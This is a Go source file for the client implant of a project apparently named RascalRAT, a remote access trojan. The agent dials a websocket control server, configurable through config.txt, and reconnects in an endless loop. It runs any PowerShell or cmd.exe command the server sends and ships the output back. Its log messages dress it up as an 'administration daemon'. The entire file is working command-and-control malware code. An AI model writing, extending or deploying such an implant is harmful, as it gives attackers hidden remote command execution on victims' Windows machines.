package main

import (
	"context"
	"log/slog"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/its-ernest/RascalRAT/internal/protocol"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

const (
	DefaultServerURL = "ws://localhost:8080/ws/connect?id=win-vbox-01"
	ConfigFileName   = "config.txt"
)

func main() {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	slog.Info("initializing administration daemon...")

	serverURL := resolveServerURL()

	// Persistent network connectivity loop
	for {
		slog.Info("attempting connection upstream", "url", serverURL)
		err := establishControlLine(serverURL)
		if err != nil {
			slog.Error("control line handshake failed, retrying in 5 seconds", "err", err)
			time.Sleep(5 * time.Second)
			continue
		}
	}
}

func resolveServerURL() string {
	data, err := os.ReadFile(ConfigFileName)
	if err != nil {
		slog.Warn("could not read local configuration file, reverting to defaults", "err", err)
		return DefaultServerURL
	}

	urlStr := strings.TrimSpace(string(data))
	if urlStr == "" {
		return DefaultServerURL
	}
	return urlStr
}

func establishControlLine(urlStr string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	header := http.Header{}
	header.Add("localtonet-skip-warning", "true")

	opts := &websocket.DialOptions{HTTPHeader: header}
	conn, _, err := websocket.Dial(ctx, urlStr, opts)
	if err != nil {
		return err
	}
	defer conn.Close(websocket.StatusNormalClosure, "daemon terminating connection")

	slog.Info("established connection pipeline with control plane")
	return runExecutionProcessor(context.Background(), conn)
}

func runExecutionProcessor(ctx context.Context, conn *websocket.Conn) error {
	conn.SetReadLimit(1024 * 1024 * 4) // 4MB constraint

	for {
		var taskRequest protocol.TaskRequest
		if err := wsjson.Read(ctx, conn, &taskRequest); err != nil {
			return err
		}

		slog.Info("received administrative task instruction", "task_id", taskRequest.TaskID)
		go executeAndReply(ctx, conn, taskRequest)
	}
}

func executeAndReply(ctx context.Context, conn *websocket.Conn, task protocol.TaskRequest) {
	startTime := time.Now()

	execCtx, cancel := context.WithTimeout(ctx, task.Timeout)
	defer cancel()

	var cmd *exec.Cmd
	switch strings.ToLower(task.PayloadType) {
	case "powershell":
		cmd = exec.CommandContext(execCtx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", task.ScriptBlock)
	default:
		cmd = exec.CommandContext(execCtx, "cmd.exe", "/c", task.ScriptBlock)
	}

	// CombinedOutput safely captures both stdout and stderr into a single slice natively
	outputBytes, err := cmd.CombinedOutput()

	response := protocol.TaskResponse{
		TaskID:   task.TaskID,
		Success:  err == nil,
		Stdout:   string(outputBytes),
		Duration: time.Since(startTime),
	}

	if err != nil {
		response.ErrorMessage = err.Error()
		if exitError, ok := err.(*exec.ExitError); ok {
			response.ExitCode = exitError.ExitCode()
		} else {
			response.ExitCode = 1
		}
	}

	shipResponse(ctx, conn, response)
}

func shipResponse(ctx context.Context, conn *websocket.Conn, resp protocol.TaskResponse) {
	writeCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	if err := wsjson.Write(writeCtx, conn, resp); err != nil {
		slog.Error("failed to write response to websocket line", "err", err)
	}
}
